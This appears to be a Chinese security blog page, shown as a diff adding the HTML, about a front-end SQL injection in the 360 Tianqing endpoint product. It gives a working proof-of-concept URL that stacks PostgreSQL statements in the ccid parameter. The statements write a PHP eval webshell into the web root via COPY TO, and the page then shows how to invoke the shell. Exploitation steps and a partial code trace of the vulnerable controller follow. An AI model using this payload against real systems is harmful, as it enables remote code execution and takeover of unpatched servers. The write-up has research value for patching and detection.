@@ -1,0 +1,182 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>360天擎-前台SQL注入 | P1and</title>
+<meta name="description" content="丈夫只手把吴钩">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://p1and.github.io/favicon.ico?v=1623841554612">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://p1and.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://p1and.github.io">
+        <img class="avatar" src="https://p1and.github.io/images/avatar.png?v=1623841554612" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://p1and.github.io">
+        <h1 class="site-title">P1and</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">360天擎-前台SQL注入</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2021-06-16</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://p1and.github.io/sU4NsMlVQ/">
+                    2021HVV
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <pre><code>POC：
+https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('&lt;?php @eval($_POST[1]);?&gt;');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- 
+</code></pre>
+<p>利用过程:<br>
+1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell<br>
+2. 通过注入点，创建一张表 O<br>
+3. 为 表O 添加一个新字段 T 并且写入shell内容<br>
+4. Postgres数据库 使用COPY TO把一个表的所有内容都拷贝到一个文件(完成写shell)<br>
+5. 删除 表O</p>
+<pre><code>shell地址:
+https://192.168.24.196:8443/1.php
+POST
+1=phpinfo();
+</code></pre>
+<h2 id="漏洞演示">漏洞演示</h2>
+<figure data-type="image" tabindex="1"><img src="https://p1and.github.io/post-images/1623841262290.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://p1and.github.io/post-images/1623841271920.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://p1and.github.io/post-images/1623841284509.png" alt="" loading="lazy"></figure>
+<h2 id="漏洞详情">漏洞详情</h2>
+<p>天擎默认安装位置: C:\Program Files (x86)\360\skylar6\</p>
+<p>首先打开：C:\Program Files (x86)\360\skylar6\www\data\adminlog_path_dict.json 该路径存放了大量的接口地址，并且可以该文件已列出是否开放接口</p>
+<figure data-type="image" tabindex="4"><img src="https://p1and.github.io/post-images/1623841345914.png" alt="" loading="lazy"></figure>
+<p>那么重点先查看一下这些开放的端口即可</p>
+<p>其中盯上了一个接口：api/dp/rptsvcsyncpoint</p>
+<p>通过查看yii手册知道了路由走向，接口文件地址：C:\Program Files (x86)\360\skylar6\www\application\api\controllers\DpController.php</p>
+<figure data-type="image" tabindex="5"><img src="https://p1and.github.io/post-images/1623841358030.png" alt="" loading="lazy"></figure>
+<p>进来以后看到它接收了 <code>$cc_id = $this-&gt;getParam(&quot;ccid&quot;)</code> 并且被 <code>getSyncPoint()</code> 方法接收</p>
+<p>跟进去<code>getSyncPoint()</code>方法 地址为: C:\Program Files (x86)\360\skylar6\www\source\domain\dao\DataPortalDao.php</p>
+<figure data-type="image" tabindex="6"><img src="https://p1and.github.io/post-images/1623841381108.jpg" alt="" loading="lazy"></figure>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://p1and.github.io/hello-gridea/">
+              <h3 class="post-title">
+                下一篇：Hello Gridea
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">丈夫只手把吴钩</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by P1and | <a class="rss" href="https://p1and.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
